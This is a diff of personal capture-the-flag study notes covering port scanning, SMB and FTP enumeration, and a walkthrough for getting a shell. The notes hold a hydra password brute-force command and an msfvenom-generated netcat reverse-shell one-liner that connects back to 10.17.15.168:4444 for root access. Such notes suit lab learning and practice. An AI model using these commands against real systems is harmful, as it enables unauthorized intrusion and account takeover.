@@ -1,4 +1,4 @@
-# general steps when starting a CTF #
+# general guide when starting a CTF #
 
 1) Scan Ports and Versions (NMAP)
     - Create a file to store the nmap scan
@@ -22,15 +22,24 @@
         --badsum == used to potentially scan for firewall/IDS in the network/host
 
 
-
     Attacking an SMB server
         - use enum4linux to scan the server: ex enum4linux -a [IP]
         - this will give us information about the SMB server: shares, domain/workgroup name, username, OS version, etc...
         - try to connect to the interesting shares: ex smbclient //10.10.10.2/profiles -U [name] -p [port]
             - use "Anonymous" as username and a blank password to try to connect, it might be enabled by default
         - once inside a share, use cd, get, put, pwd, mget and mput to navigate and download/upload files
-        
 
+
+    Attacking an FTP server
+        - use nmap to check details. use the --script=ftp-anon to check if you can login with the user Anonymous(blank password)
+        - if anon_login==true, log into the ftp server and look around 
+        - once a possible username has been found, use hydra to bruteforce the password
+            - ex hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV [target_IP] ftp
+                -t 4 == parallel connections per target
+                -l == user
+                -P == path to wordlist directory
+                -vV == verbosity lvl over 9000
+        - if the password was cracked, nice shit! you can now fuck em up and escalate privilege if the account isn't good enough
 
 
     Getting a private ssh key of the target(you could add your own pub key, but that generaly doesn't work)
@@ -41,6 +50,47 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    Connected to a TELNET/?SSH? session on the target and not able to use any commands:
+        - make your local machine to listen to icmp traffic with tcpdump
+            - sudo tcpdump ip proto \\icmp -i [your_NIC(ex tun0,wlan0)]
+        - on the taget machine ping your local machine
+            - .RUN ping [local_machine_IP] -c 1
+            - not sure if .RUN exists on every telnet session, look into it later
+        - if that worked, use 'msfvenom' to generate a reverse shell to attack the target machine(done on your local machine)
+            - msfvenom -p cmd/unix/reverse_netcat lhost=[your_localmachine_IP] lport=[same_port_as_netcat] R
+                -p == payload
+                lhost = our local host IP address (this is your machine's IP address)
+                lport = the port to listen on (this is the port on your machine)
+                R = export the payload in raw format
+        - now start listening to the port we want(has to be the same as in the msfvenom reverse shell)
+            - nc -lvp [port]
+        - then, copy output of the msfvenom command above and execute it in the TELNET session
+            - ex .RUN mkfifo /tmp/lnhyr; nc 10.17.15.168 4444 0</tmp/lnhyr | /bin/sh >/tmp/lnhyr 2>&1; rm /tmp/lnhyr
+        - finally, the terminal listening with netcat should get access to the target machine as root, making you able to run any command, even if the interface is
+          lackluster :)
 
 
 
